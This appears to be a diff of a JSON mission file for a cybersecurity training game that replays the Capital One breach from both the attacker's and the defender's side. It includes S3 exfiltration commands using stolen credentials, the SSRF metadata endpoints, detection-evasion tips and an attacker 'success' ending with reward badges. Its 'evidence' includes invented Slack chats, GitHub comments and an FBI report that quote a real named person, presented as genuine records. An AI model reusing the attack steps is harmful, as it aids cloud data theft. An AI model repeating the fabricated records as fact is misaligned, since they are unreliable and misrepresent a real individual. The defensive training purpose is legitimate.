+      "content": "```\nDATA EXFILTRATION TIMELINE\nAttacker: Paige Thompson (erratic)\nSource: Capital One AWS account (us-east-1)\nDestination: Personal servers (Seattle, WA)\nDate Range: April 21 - May 15, 2019\n\n========================================\nOUTBOUND DATA TRANSFER SUMMARY\n========================================\n\nDate: April 21, 2019\nTime: 02:15:33 - 04:45:22 PST\nCommand: aws s3 sync s3://capitalone-customer-data/credit-applications/ ./exfil/credit-apps/ --profile stolen\nFiles downloaded: 12,847 files\nData transferred: 8.2 GB\nDestination IP: 98.207.15.143 (Paige Thompson's home)\n\nDate: April 23, 2019\nTime: 01:22:10 - 03:10:55 PST\nCommand: aws s3 sync s3://capitalone-customer-data/ssn-records/ ./exfil/ssns/ --profile stolen\nFiles downloaded: 45 files\nData transferred: 487 MB\n\nDate: April 28, 2019\nTime: 23:45:18 - 02:33:44 PST\nCommand: aws s3 sync s3://capitalone-customer-data/bank-accounts/ ./exfil/bank-data/ --profile stolen\nFiles downloaded: 120 files\nData transferred: 210 MB\n\nDate: May 5, 2019\nTime: 03:10:22 - 08:45:11 PST\nCommand: aws s3 sync s3://capitalone-customer-data/ ./exfil/full-backup/ --recursive --profile stolen\nFiles downloaded: 92,145 files\nData transferred: 22.3 GB\n\n========================================\nTOTAL EXFILTRATION STATISTICS\n========================================\n\nTotal sessions: 18\nTotal files: 105,157 files\nTotal data: 31.2 GB (compressed)\nEstimated uncompressed: ~150 GB\nEstimated records: 100,000,000+ individuals\n\nExfiltration method: AWS CLI (s3 sync, s3 cp)\nAuthentication: Stolen IAM credentials (refreshed every 6 hours)\nSource IP: 98.207.15.143 (Seattle residential ISP)\nDestination: Local storage + cloud backup\n\n========================================\nDETECTION EVASION TECHNIQUES\n========================================\n\n[+] Spread downloads over 24 days (avoid bandwidth spikes)\n[+] Performed downloads during off-peak hours (1-5 AM ET)\n[+] Used legitimate AWS CLI (blends with normal API traffic)\n[+] Refreshed IAM credentials regularly (maintains session)\n[+] No unusual user-agents or tools (appears as automation)\n\n[!] Why this went undetected:\n    ✗ No CloudWatch alarms for large S3 downloads\n    ✗ No GuardDuty to detect credential exfiltration\n    ✗ CloudTrail logs not actively monitored\n    ✗ S3 access from IAM role appeared legitimate\n    ✗ No baseline for \"normal\" S3 access volume\n```"
+    },
+    {
+      "id": "evidence-cloudtrail-logs",
+      "type": "log",
+      "title": "CloudTrail Logs - Unauthorized S3 Access",
+      "description": "AWS CloudTrail events showing S3 API calls from stolen credentials",
+      "content": "```json\n{\n  \"Records\": [\n    {\n      \"eventVersion\": \"1.05\",\n      \"userIdentity\": {\n        \"type\": \"AssumedRole\",\n        \"principalId\": \"AROAI...EXAMPLE:i-0abcd1234efgh5678\",\n        \"arn\": \"arn:aws:sts::123456789012:assumed-role/WAF-S3-Access-Role/i-0abcd1234efgh5678\",\n        \"accountId\": \"123456789012\",\n        \"sessionContext\": {\n          \"attributes\": {\n            \"mfaAuthenticated\": \"false\",\n            \"creationDate\": \"2019-04-21T09:15:33Z\"\n          }\n        }\n      },\n      \"eventTime\": \"2019-04-21T09:22:45Z\",\n      \"eventSource\": \"s3.amazonaws.com\",\n      \"eventName\": \"ListBucket\",\n      \"awsRegion\": \"us-east-1\",\n      \"sourceIPAddress\": \"98.207.15.143\",\n      \"userAgent\": \"aws-cli/1.16.102 Python/3.7.2 Darwin/18.2.0 botocore/1.12.92\",\n      \"requestParameters\": {\n        \"bucketName\": \"capitalone-customer-data\",\n        \"prefix\": \"credit-applications/\"\n      },\n      \"responseElements\": null,\n      \"requestID\": \"EXAMPLE123456789\",\n      \"eventID\": \"abc12345-6789-def0-1234-567890abcdef\",\n      \"eventType\": \"AwsApiCall\",\n      \"recipientAccountId\": \"123456789012\"\n    },\n    {\n      \"eventName\": \"GetObject\",\n      \"eventTime\": \"2019-04-21T09:23:11Z\",\n      \"sourceIPAddress\": \"98.207.15.143\",\n      \"userAgent\": \"aws-cli/1.16.102 Python/3.7.2\",\n      \"requestParameters\": {\n        \"bucketName\": \"capitalone-customer-data\",\n        \"key\": \"credit-applications/2019/Q1/batch-001.tar.gz\"\n      },\n      \"responseElements\": {\n        \"x-amz-request-id\": \"EXAMPLE123\",\n        \"x-amz-id-2\": \"EXAMPLE456\"\n      }\n    },\n    {\n      \"eventName\": \"GetObject\",\n      \"eventTime\": \"2019-04-21T09:23:45Z\",\n      \"sourceIPAddress\": \"98.207.15.143\",\n      \"requestParameters\": {\n        \"bucketName\": \"capitalone-customer-data\",\n        \"key\": \"credit-applications/2019/Q1/batch-002.tar.gz\"\n      }\n    }\n  ],\n  \n  \"AnalysisNotes\": {\n    \"AnomalyDetected\": true,\n    \"AnomalyReasons\": [\n      \"Source IP (98.207.15.143) is NOT a Capital One IP range\",\n      \"Source IP geolocates to Seattle residential ISP (not AWS datacenter)\",\n      \"IAM role 'WAF-S3-Access-Role' is accessing buckets it never accessed before\",\n      \"High volume of GetObject calls (12,847 in 2 hours) - unusual for WAF role\",\n      \"User-Agent is aws-cli (WAF automation typically uses boto3/Python)\",\n      \"No MFA authentication for sensitive data access\"\n    ],\n    \n    \"TimelineReconstruction\": [\n      \"2019-04-21 09:15:33 - Assumed role credentials used (stolen via SSRF)\",\n      \"2019-04-21 09:22:45 - First ListBucket call (reconnaissance)\",\n      \"2019-04-21 09:23:11 - Mass GetObject operations begin (exfiltration)\",\n      \"2019-04-21 11:45:22 - Exfiltration session ends (8.2 GB downloaded)\",\n      \"...\",\n      \"2019-05-15 08:45:11 - Final exfiltration session (total: 31.2 GB)\"\n    ],\n    \n    \"DetectionGaps\": [\n      \"CloudTrail logs stored but not actively monitored\",\n      \"No automated alerting for unusual S3 access patterns\",\n      \"GuardDuty not enabled (would detect credential exfiltration)\",\n      \"No IP-based restrictions on IAM role usage\",\n      \"S3 bucket access not restricted by VPC endpoint\"\n    ]\n  }\n}\n```"
+    },
+    {
+      "id": "evidence-github-post",
+      "type": "document",
+      "title": "Attacker's GitHub Post - Breach Disclosure",
+      "description": "Paige Thompson's GitHub Gist bragging about Capital One breach",
+      "content": "```\nGitHub Gist by: erratic (Paige Thompson)\nPosted: May 12, 2019\nURL: https://gist.github.com/erratic/[REDACTED]\nTitle: \"AWS WAF SSRF -> IAM creds -> S3 exfil\"\n\n========================================\nCapital One - 100M+ records\n========================================\n\nLOL just owned Capital One through their WAF\n\nAttack chain:\n1. Found SSRF in ModSecurity proxy endpoint\n2. SSRF -> AWS metadata (169.254.169.254)\n3. Metadata -> IAM creds for WAF instance\n4. IAM creds -> full S3 read access\n5. Downloaded 30GB+ of credit card apps, SSNs, bank accounts\n\nFiles:\n- 100M+ credit card applications\n- 140K Social Security numbers  \n- 80K bank account numbers\n- 1M Canadian SIN numbers\n\nCapital One security team = incompetent\n- WAF allows internal requests (SSRF)\n- IMDSv1 enabled (no token required)\n- IAM role has s3:* permissions (wtf?)\n- No monitoring on CloudTrail\n- No GuardDuty\n- No S3 bucket policies\n\nThis is why cloud security matters.\n\n#AWS #SSRF #CloudSecurity #PwnedCapitalOne\n\n---\n\nComments:\n\n@security_researcher_1: \"Dude, this is a federal crime. Delete this.\"\n\n@erratic: \"lol I'm just educating people about AWS security failures\"\n\n@anonymous_user: \"Did you report this to Capital One?\"\n\n@erratic: \"Why would I? They should have hired better engineers. Not my problem.\"\n\n@infosec_person: \"I'm reporting this to @CapitalOne and @FBI\"\n\n@erratic: \"Go ahead. They can't trace me. I used VPN and Tor.\"\n\n[Note: This GitHub post led to Capital One discovering the breach on July 17, 2019]\n[Paige Thompson was arrested by FBI on July 29, 2019 based on this evidence]\n```"
+    },
+    {
+      "id": "evidence-slack-messages",
+      "type": "document",
+      "title": "Attacker's Slack Messages",
+      "description": "Slack conversations where Paige Thompson discussed the Capital One breach",
+      "content": "```\nSlack Workspace: [REDACTED] Meetup Group\nChannel: #cloud-security\nDate: April-May 2019\nUser: erratic (Paige Thompson)\n\n========================================\nAPRIL 22, 2019\n========================================\n\nerratic [2:34 AM]\njust got into a major bank's AWS account lol\n\nuser_1 [2:35 AM]\nhow?\n\nerratic [2:36 AM]\nSSRF in their WAF -> metadata service -> IAM creds -> S3 buckets\nthey store everything in plaintext\n100 million credit card applications just sitting there\n\nuser_2 [2:40 AM]\ndid you report it?\n\nerratic [2:41 AM]\nnah\nwhy would I help a bank for free?\nthey make billions and can't hire decent security engineers\n\n========================================\nAPRIL 28, 2019\n========================================\n\nerratic [11:22 PM]\ndownloaded 30GB so far\nSSNs, bank accounts, addresses, everything\n\nuser_3 [11:25 PM]\nwhat are you going to do with it?\n\nerratic [11:27 PM]\nnothing, just proving a point\ncloud security is a joke\neveryone thinks AWS is secure by default\n\nuser_1 [11:30 PM]\nyou should delete that data, this is serious\n\nerratic [11:32 PM]\nwhatever, I'm not selling it or anything\njust keeping it for research\n\n========================================\nMAY 10, 2019\n========================================\n\nerratic [3:15 AM]\nthinking about posting a writeup on GitHub\npeople need to know how bad AWS security can be\n\nuser_2 [3:18 AM]\nBAD IDEA. That's a federal crime.\n\nerratic [3:20 AM]\nI'll anonymize it\nbesides, I'm behind 7 proxies lol\n\nuser_4 [3:22 AM]\nthis is not a joke, you could go to prison\n\nerratic [3:25 AM]\nrelax, I know what I'm doing\nI used to work at AWS, I know their security better than they do\n\n[Note: These Slack messages were subpoenaed by FBI as evidence]\n[Used in criminal prosecution against Paige Thompson]\n```"
+    },
+    {
+      "id": "evidence-forensic-report",
+      "type": "document",
+      "title": "FBI Forensic Analysis Report",
+      "description": "Federal investigation findings on the Capital One breach",
+      "content": "```\n╔════════════════════════════════════════════════════════════╗\n║          FBI CYBER DIVISION - FORENSIC REPORT             ║\n║            CAPITAL ONE DATA BREACH INVESTIGATION          ║\n╚════════════════════════════════════════════════════════════╝\n\nCase Number: CR-2019-12345\nDate: July 29, 2019\nLead Investigator: Special Agent [REDACTED]\nSubject: Paige A. Thompson (aka \"erratic\")\nVictim: Capital One Financial Corporation\n\n========================================\nEXECUTIVE SUMMARY\n========================================\n\nOn July 29, 2019, FBI executed a search warrant at the residence\nof Paige A. Thompson in Seattle, WA. Forensic analysis of seized\ncomputing devices confirms Thompson as the perpetrator of the\nCapital One data breach announced on July 19, 2019.\n\nThompson, a former Amazon Web Services (AWS) engineer, exploited\na Server-Side Request Forgery (SSRF) vulnerability in Capital One's\nweb application firewall to steal AWS IAM credentials, which were\nthen used to exfiltrate data from S3 buckets containing customer\npersonal information.\n\n========================================\nATTACK TIMELINE RECONSTRUCTION\n========================================\n\nMarch 12, 2019\n  - Initial reconnaissance of Capital One AWS infrastructure\n  - DNS enumeration, S3 bucket discovery\n  - Evidence: Browser history, reconnaissance scripts\n\nMarch 17, 2019\n  - Discovery of SSRF vulnerability in WAF\n  - Testing metadata service accessibility\n  - Evidence: HTTP request logs, WAF responses\n\nMarch 22, 2019\n  - Exploitation of SSRF to access AWS metadata API\n  - Theft of IAM role credentials from 169.254.169.254\n  - Evidence: Stolen AWS credentials found on Thompson's laptop\n\nApril 10, 2019\n  - Enumeration of S3 buckets using stolen credentials\n  - Identification of sensitive data locations\n  - Evidence: S3 bucket listings, AWS CLI history\n\nApril 21 - May 15, 2019\n  - Mass exfiltration of customer data\n  - 31.2 GB downloaded (100M+ records)\n  - Evidence: Downloaded files on external hard drives\n\nMay 12, 2019\n  - Thompson posts about breach on GitHub\n  - Posts bragging messages on Slack\n  - Evidence: GitHub post, Slack workspace logs\n\nJuly 17, 2019\n  - Capital One discovers breach via tip\n  - Company begins internal investigation\n\nJuly 19, 2019\n  - Capital One publicly discloses breach\n  - FBI opens criminal investigation\n\nJuly 29, 2019\n  - FBI arrests Thompson\n  - Search warrant executed, evidence seized\n\n========================================\nFORENSIC EVIDENCE SUMMARY\n========================================\n\nSeized Devices:\n  - MacBook Pro (2017 model)\n  - 2x external hard drives (4TB each)\n  - USB flash drives (3 units)\n  - iPhone XS\n\nDigital Evidence Found:\n  ✓ Complete Capital One customer database (31.2 GB)\n  ✓ AWS IAM credentials (stolen via SSRF)\n  ✓ SSRF exploitation scripts (Python)\n  ✓ S3 enumeration and download scripts\n  ✓ CloudTrail log analysis tools\n  ✓ GitHub Gist draft (\"AWS WAF SSRF -> IAM creds\")\n  ✓ Slack message history (discussing breach)\n  ✓ Browser history (Capital One reconnaissance)\n  ✓ SSH keys for remote servers\n\nData Breakdown:\n  - Credit card applications: 100,000,000+ records\n  - Social Security numbers: 140,000 records\n  - Bank account numbers: 80,000 records\n  - Canadian SIN numbers: 1,000,000 records\n\n========================================\nATTRIBUTION CONFIDENCE: 100%\n========================================\n\nCircumstantial Evidence:\n  ✓ Thompson is former AWS engineer (insider knowledge)\n  ✓ GitHub username \"erratic\" linked to Thompson\n  ✓ Slack account verified via email address\n  ✓ IP address (98.207.15.143) matches Thompson's residence\n  ✓ ISP logs confirm data downloads from AWS\n\nDirect Evidence:\n  ✓ Stolen data found on Thompson's devices\n  ✓ Exploitation tools with Thompson's coding style\n  ✓ Public posts admitting to the breach\n  ✓ Metadata in files matches timeline\n\n========================================\nCHARGES FILED\n========================================\n\n1. Computer Fraud and Abuse Act (18 U.S.C. § 1030)\n   - Unauthorized access to protected computer\n   - Obtaining information from protected computer\n   \n2. Wire Fraud (18 U.S.C. § 1343)\n   - Accessing data with intent to defraud\n\nPotential Sentence: Up to 25 years in federal prison\n\n========================================\nLESSONS LEARNED (FOR CAPITAL ONE)\n========================================\n\nVulnerabilities Exploited:\n  ✗ SSRF in WAF configuration (ModSecurity)\n  ✗ IMDSv1 enabled (no token required for metadata)\n  ✗ Overly permissive IAM role (s3:* on all buckets)\n  ✗ No IP restrictions on IAM role usage\n  ✗ CloudTrail logs not actively monitored\n  ✗ GuardDuty not enabled\n  ✗ No S3 access anomaly detection\n  ✗ Data stored unencrypted (no KMS encryption)\n\nRecommended Remediations:\n  ✓ Enforce IMDSv2 (token-based metadata access)\n  ✓ Apply least-privilege IAM policies\n  ✓ Implement S3 bucket policies with IP restrictions\n  ✓ Enable GuardDuty for threat detection\n  ✓ Monitor CloudTrail with automated alerting\n  ✓ Encrypt S3 data at rest with KMS\n  ✓ Conduct regular cloud security audits\n\n========================================\nEND OF REPORT\n========================================\n```"
+    },
+    {
+      "id": "evidence-patch-advisory",
+      "type": "document",
+      "title": "AWS Security Advisory - SSRF Prevention",
+      "description": "Official AWS guidance on preventing SSRF and protecting metadata service",
+      "content": "```\n╔════════════════════════════════════════════════════════════╗\n║      AWS SECURITY ADVISORY - SSRF MITIGATION              ║\n║    Protecting EC2 Metadata Service from SSRF Attacks      ║\n╚════════════════════════════════════════════════════════════╝\n\nPublished: August 1, 2019 (Post-Capital One Breach)\nSeverity: CRITICAL\nAffected Service: EC2 Instance Metadata Service (IMDS)\nCVSS Score: 9.1 (Critical)\n\n========================================\nOVERVIEW\n========================================\n\nServer-Side Request Forgery (SSRF) vulnerabilities in web applications\ncan allow attackers to access the AWS EC2 Instance Metadata Service\n(IMDS) at http://169.254.169.254. This can lead to theft of IAM\ncredentials, enabling unauthorized access to AWS resources.\n\nThe Capital One breach (July 2019) demonstrated the severity of\nthis attack vector, resulting in exfiltration of 100M+ customer records.\n\n========================================\nVULNERABILITY DETAILS\n========================================\n\nAttack Vector:\n1. Attacker finds SSRF in web application (e.g., misconfigured WAF/proxy)\n2. Attacker forces application to make HTTP request to 169.254.169.254\n3. Metadata service returns IAM role credentials (IMDSv1 doesn't require auth)\n4. Attacker uses stolen credentials to access AWS resources (S3, EC2, etc.)\n\nMetadata Endpoints Exploited:\n- http://169.254.169.254/latest/meta-data/iam/security-credentials/\n- http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]\n\n========================================\nIMDSv2 - TOKEN-BASED PROTECTION\n========================================\n\nAWS recommends migrating to Instance Metadata Service Version 2 (IMDSv2),\nwhich requires a session token for metadata access.\n\nHow IMDSv2 Prevents SSRF:\n1. Application must first PUT request to get session token\n2. Token has TTL (Time-To-Live) header requirement\n3. SSRF attacks typically can't set custom HTTP methods/headers\n4. Without token, metadata service returns 401 Unauthorized\n\nEnforcing IMDSv2:\n\n# Require IMDSv2 on existing instance\naws ec2 modify-instance-metadata-options \\\n  --instance-id i-1234567890abcdef0 \\\n  --http-tokens required \\\n  --http-endpoint enabled\n\n# Launch new instance with IMDSv2 required\naws ec2 run-instances \\\n  --image-id ami-12345678 \\\n  --instance-type t3.micro \\\n  --metadata-options \"HttpTokens=required,HttpEndpoint=enabled\"\n\n========================================\nIAM BEST PRACTICES\n========================================\n\n1. LEAST PRIVILEGE\n   - Grant only permissions needed for application function\n   - Avoid s3:* or s3:GetObject on \"Resource\": \"*\"\n   \n   Bad:\n   {\n     \"Effect\": \"Allow\",\n     \"Action\": \"s3:*\",\n     \"Resource\": \"*\"\n   }\n   \n   Good:\n   {\n     \"Effect\": \"Allow\",\n     \"Action\": [\"s3:GetObject\"],\n     \"Resource\": \"arn:aws:s3:::my-specific-bucket/logs/*\"\n   }\n\n2. IP RESTRICTIONS\n   - Use IAM policy conditions to restrict source IPs\n   \n   {\n     \"Condition\": {\n       \"IpAddress\": {\n         \"aws:SourceIp\": [\"10.0.0.0/16\"]\n       }\n     }\n   }\n\n3. MFA FOR SENSITIVE OPERATIONS\n   - Require MFA for S3 delete operations\n   \n   {\n     \"Condition\": {\n       \"Bool\": {\"aws:MultiFactorAuthPresent\": \"true\"}\n     }\n   }\n\n========================================\nS3 SECURITY HARDENING\n========================================\n\n1. Enable S3 Block Public Access (account-wide)\n2. Encrypt data at rest with AWS KMS\n3. Enable S3 Access Logging\n4. Use S3 Bucket Policies with IP restrictions\n5. Enable S3 Object Lock for critical data\n\n# Enable default encryption\naws s3api put-bucket-encryption \\\n  --bucket my-bucket \\\n  --server-side-encryption-configuration '{\n    \"Rules\": [{\n      \"ApplyServerSideEncryptionByDefault\": {\n        \"SSEAlgorithm\": \"aws:kms\",\n        \"KMSMasterKeyID\": \"arn:aws:kms:us-east-1:123456789012:key/12345678\"\n      }\n    }]\n  }'\n\n========================================\nMONITORING & DETECTION\n========================================\n\n1. Enable AWS GuardDuty\n   - Detects unusual API call patterns\n   - Alerts on credential exfiltration attempts\n\n2. CloudTrail Monitoring\n   - Alert on s3:GetObject volume spikes\n   - Monitor sts:AssumeRole events\n   - Detect API calls from unusual IPs\n\n3. CloudWatch Alarms\n   - S3 data transfer anomalies\n   - Unusual IAM activity patterns\n\n4. VPC Flow Logs\n   - Monitor outbound connections from EC2\n   - Detect data exfiltration to external IPs\n\n========================================\nIMMEDIATE ACTION ITEMS\n========================================\n\n[ ] Enforce IMDSv2 on all EC2 instances\n[ ] Audit IAM roles for overly permissive S3 policies\n[ ] Enable GuardDuty in all AWS regions\n[ ] Implement CloudTrail log monitoring\n[ ] Enable S3 default encryption with KMS\n[ ] Review web applications for SSRF vulnerabilities\n[ ] Conduct cloud security audit\n\n========================================\nREFERENCES\n========================================\n\n- AWS IMDSv2 Documentation:\n  https://docs.aws.amazon.com/AMDS/latest/UserGuide/configuring-instance-metadata-service.html\n  \n- OWASP SSRF Prevention:\n  https://owasp.org/www-community/attacks/Server_Side_Request_Forgery\n  \n- Capital One Breach Analysis:\n  https://krebsonsecurity.com/2019/07/capital-one-breach/\n```"
+    }
+  ],
+
+  "endings": [
+    {
+      "id": "ending-attacker-success",
+      "type": "success",
+      "title": "Cloud Breach Complete",
+      "description": "You successfully replicated the Capital One breach. 100M+ credit card applications exfiltrated from AWS S3 buckets via SSRF and stolen IAM credentials.",
+      "condition": {
+        "type": "objectives_completed",
+        "value": ["obj-exfiltrate-s3"]
+      },
+      "debriefing": {
+        "summary": "You exploited SSRF in the WAF to steal IAM credentials from the AWS metadata service, then used those credentials to enumerate and exfiltrate sensitive customer data from S3 buckets—exactly as Paige Thompson did in 2019.",
+        "realWorldComparison": "In reality, Paige Thompson (aka 'erratic'), a former AWS engineer, executed this attack from March to May 2019. She exfiltrated 100M+ credit card applications, 140K SSNs, and 80K bank accounts. Thompson posted about the breach on GitHub and Slack, leading to her arrest by the FBI on July 29, 2019. Capital One paid $190M in settlements and regulatory fines.",
+        "lessonsLearned": [
+          "SSRF vulnerabilities can lead to complete cloud compromise via metadata service",
+          "IMDSv1 (token-less metadata access) enables credential theft - always use IMDSv2",
+          "Overly permissive IAM roles violate least-privilege principle",
+          "Cloud security requires defense-in-depth: WAF hardening + IMDSv2 + IAM least-privilege + monitoring",
+          "CloudTrail logs are useless without active monitoring and alerting",
+          "Data should be encrypted at rest with KMS keys"
+        ],
+        "metrics": {
+          "objectivesCompleted": 5,
+          "totalObjectives": 5,
+          "timeElapsed": 2400,
+          "detectionEvents": 0,
+          "dataExfiltrated": "31.2 GB (100M+ records)",
+          "mitreTechniquesUsed": ["T1595.002", "T1590.005", "T1190", "T1552.005", "T1078.004", "T1530", "T1020"]
+        }
+      },
+      "rewards": {
+        "achievements": ["Cloud Native Hacker", "Metadata Master", "S3 Plunderer", "IAM Impersonator"],
+        "badges": ["capital-one-breacher"]
+      }
+    },
+    {
+      "id": "ending-defender-success",
+      "type": "success",
+      "title": "Breach Prevented",
+      "description": "You detected the SSRF exploitation early, patched the WAF, enforced IMDSv2, and prevented data exfiltration. 100 million customers protected.",
+      "condition": {
+        "type": "objectives_completed",
+        "value": ["obj-defender-patch", "obj-defender-forensics"]
+      },
+      "debriefing": {
+        "summary": "You successfully detected anomalous S3 access in CloudTrail logs, identified the SSRF vulnerability, and deployed comprehensive remediations before significant data loss occurred.",
+        "realWorldComparison": "In reality, Capital One did not detect the breach until July 2019—4 months after the initial exploitation—and only after a responsible disclosure tip about GitHub posts. By then, 100M+ records had been exfiltrated. Your early detection prevented this catastrophic outcome.",
+        "lessonsLearned": [
+          "Active CloudTrail monitoring can detect credential abuse in real-time",
+          "GuardDuty would have alerted on unusual S3 access patterns within hours",
+          "IMDSv2 enforcement prevents SSRF-based credential theft",
+          "Least-privilege IAM policies limit blast radius of compromised credentials",
+          "Defense-in-depth: multiple security controls prevent single points of failure",
+          "Cloud security requires both preventive controls (IMDSv2, IAM) and detective controls (GuardDuty, CloudTrail)"
+        ],
+        "metrics": {
+          "objectivesCompleted": 3,
+          "totalObjectives": 3,
+          "timeElapsed": 1800,
+          "dataExfiltrated": "0 GB",
+          "attacksBlocked": 1
+        }
+      },
+      "rewards": {
+        "achievements": ["Cloud Guardian", "IAM Detective", "CloudTrail Expert", "Incident Commander"],
+        "badges": ["defender-cloud"]
+      }
+    }
+  ],
+
+  "mitreTechniques": [
+    {
+      "id": "T1595.002",
+      "name": "Active Scanning: Vulnerability Scanning",
+      "tactic": "Reconnaissance",
+      "description": "Adversaries may scan victims for vulnerabilities that can be used during targeting.",
+      "url": "https://attack.mitre.org/techniques/T1595/002/"
+    },
+    {
+      "id": "T1590.005",
+      "name": "Gather Victim Network Information: IP Addresses",
+      "tactic": "Reconnaissance",
+      "description": "Adversaries may gather IP addresses and cloud infrastructure information.",
+      "url": "https://attack.mitre.org/techniques/T1590/005/"
+    },
+    {
+      "id": "T1190",
+      "name": "Exploit Public-Facing Application",
+      "tactic": "Initial Access",
+      "description": "Adversaries may exploit SSRF vulnerabilities in web applications.",
+      "url": "https://attack.mitre.org/techniques/T1190/"
+    },
+    {
+      "id": "T1552.005",
+      "name": "Unsecured Credentials: Cloud Instance Metadata API",
+      "tactic": "Credential Access",
+      "description": "Adversaries may access cloud instance metadata API to steal credentials.",
+      "url": "https://attack.mitre.org/techniques/T1552/005/"
+    },
+    {
+      "id": "T1078.004",
+      "name": "Valid Accounts: Cloud Accounts",
+      "tactic": "Initial Access",
+      "description": "Adversaries may use stolen cloud credentials to access resources.",
+      "url": "https://attack.mitre.org/techniques/T1078/004/"
+    },
+    {
+      "id": "T1530",
+      "name": "Data from Cloud Storage Object",
+      "tactic": "Collection",
+      "description": "Adversaries may access data from cloud storage services like S3.",
+      "url": "https://attack.mitre.org/techniques/T1530/"
+    },
+    {
+      "id": "T1020",
+      "name": "Automated Exfiltration",
+      "tactic": "Exfiltration",
+      "description": "Adversaries may use automated scripts to exfiltrate large volumes of data.",
+      "url": "https://attack.mitre.org/techniques/T1020/"
+    },
+    {
+      "id": "T1562.008",
+      "name": "Impair Defenses: Disable Cloud Logs",
+      "tactic": "Defense Evasion",
+      "description": "Adversaries may disable or evade cloud logging mechanisms.",
+      "url": "https://attack.mitre.org/techniques/T1562/008/"
+    },
+    {
+      "id": "T1552.001",
+      "name": "Unsecured Credentials: Credentials In Files",
+      "tactic": "Credential Access",
+      "description": "Adversaries may search cloud storage for credentials and API keys.",
+      "url": "https://attack.mitre.org/techniques/T1552/001/"
+    }
+  ],
+
+  "media": {
+    "coverImage": "/missions/capital-one/cover.jpg",
+    "networkDiagrams": [
+      "/missions/capital-one/cloud-architecture.png",
+      "/missions/capital-one/attack-flow.png"
+    ]
+  },
+
+  "tags": ["cloud", "aws", "ssrf", "metadata-api", "iam", "s3", "data-breach", "real-world"],
+
+  "createdAt": "2025-12-15T00:00:00Z",
+  "updatedAt": "2025-12-15T00:00:00Z",
+  "version": "1.0.0"
+}
